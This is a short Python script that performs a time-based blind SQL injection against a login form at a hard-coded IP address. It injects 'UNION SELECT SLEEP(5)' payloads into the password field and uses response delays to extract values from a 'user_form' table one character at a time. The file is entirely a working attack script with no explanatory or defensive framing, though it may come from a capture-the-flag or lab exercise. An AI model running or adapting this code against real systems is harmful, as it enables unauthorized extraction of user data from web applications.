import time
import requests


def trouver_tab0():
    tab = ["id", "name", "email", "password"]
    dictionary = ["1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
    texte = ""
    TIME = 5
    table = ",1,2"
    a = 0
    idk = []
    url = "http://51.15.136.118/pageid.php"
    for i in range(1, 10):
        for j in range(0, len(dictionary)):
            if a > 36:
                if texte != "":
                    print(texte)
                    rm_letter = texte[0]
                    dictionary.remove(rm_letter)
                    idk.append(texte)
                    a=0
                    texte = ""
                    break
            usr = "idc"
            start_time = time.time()
            passwd = "' UNION SELECT SLEEP(5)" + table + " "" " + tab[0] + " FROM user_form WHERE " + tab[0] + " like '" + texte + dictionary[j] + "%' -- "
            response = requests.post(url, data={'username': usr, 'password': passwd})
            print(passwd)
            end_time = time.time()
            print(a)
            total_time = end_time - start_time
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                a=0
            
            a +=1
    print(idk)


trouver_tab0()